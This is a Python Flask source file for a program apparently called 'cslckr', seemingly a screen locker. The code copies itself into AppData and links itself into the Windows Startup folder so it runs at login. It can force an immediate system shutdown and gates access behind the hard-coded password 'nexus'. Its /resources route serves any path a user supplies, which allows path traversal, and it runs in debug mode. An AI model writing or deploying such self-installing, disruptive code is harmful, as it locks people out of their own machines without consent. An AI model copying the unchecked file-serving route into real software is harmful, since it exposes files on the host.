import os
import sys
import shutil
import subprocess
from flask import Flask, send_file, request, redirect, url_for
 
app = Flask(__name__)

def create_shortcut():
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = os.path.abspath(__file__)

    destination_location = os.path.join(os.path.expanduser("~"), "AppData")
    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckr.lnk")
    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "cslckr.lnk")

    if os.name == 'nt':
        shutil.copy(source_file, destination_location)
        subprocess.run(["mklink", startup_shortcut_path, source_file], check=True, shell=True)
        subprocess.run(["mklink", programs_shortcut_path, source_file], check=True, shell=True)
    else:
        print("Shortcut creation is only supported on Windows.")

def shutdown():
    subprocess.call(['shutdown', '/s', '/t', '0'])

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'nexus':
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    return send_file('templates/index.html')

@app.route('/success')
def success():
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    return send_file('templates/failure.html')

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

if __name__ == "__main__":
    app.run(debug=True)